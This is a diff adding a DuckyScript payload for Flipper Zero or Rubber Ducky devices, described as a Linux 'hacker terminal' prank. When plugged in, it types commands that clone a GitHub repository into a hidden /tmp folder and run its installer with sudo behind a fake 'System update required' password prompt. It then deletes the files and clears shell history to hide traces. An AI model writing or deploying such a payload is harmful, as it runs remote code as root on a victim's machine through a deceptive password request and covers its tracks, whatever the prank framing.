@@ -1,0 +1,67 @@
+REM Hacker Terminal Stealth Prank for Linux
+REM For use with Flipper Zero BadUSB/RubberDucky
+REM Uses the stealth installation method
+REM Created: December 2024
+
+REM Open Terminal (for various Linux distros)
+ALT F2
+DELAY 500
+STRING gnome-terminal || konsole || xterm || x-terminal-emulator
+DELAY 1000
+ENTER
+DELAY 1500
+
+REM Alternative method to open terminal if above fails
+REM CTRL ALT t
+REM DELAY 1500
+
+REM Create a temporary directory to work in
+STRING mkdir -p /tmp/.cache_update && cd /tmp/.cache_update
+ENTER
+DELAY 300
+
+REM Clone the repository quietly
+STRING git clone -q https://github.com/Gr3y-foX/linux_hacker_theme_video.git .src 2>/dev/null
+ENTER
+DELAY 5000
+
+REM Navigate to the project directory
+STRING cd .src
+ENTER
+DELAY 300
+
+REM Make the stealth installer executable
+STRING chmod +x install_stealth.sh
+ENTER
+DELAY 200
+
+REM Run the stealth installer with sudo
+STRING echo "System update required. Please enter your password:" && sudo ./install_stealth.sh
+ENTER
+DELAY 500
+
+REM The user will need to enter their password here
+REM Wait for installation to complete
+DELAY 15000
+
+REM Clean up installation files to hide traces
+STRING cd / && sudo rm -rf /tmp/.cache_update
+ENTER
+DELAY 500
+
+REM Clear terminal history
+STRING history -c && clear
+ENTER
+DELAY 200
+
+REM Now run the installed command
+STRING show_time
+ENTER
+DELAY 500
+
+REM Maximize the terminal window for full effect
+F11
+DELAY 200
+
+REM The application is now running with the hacker terminal visuals
+REM The prank is complete and will run until the user figures out how to exit
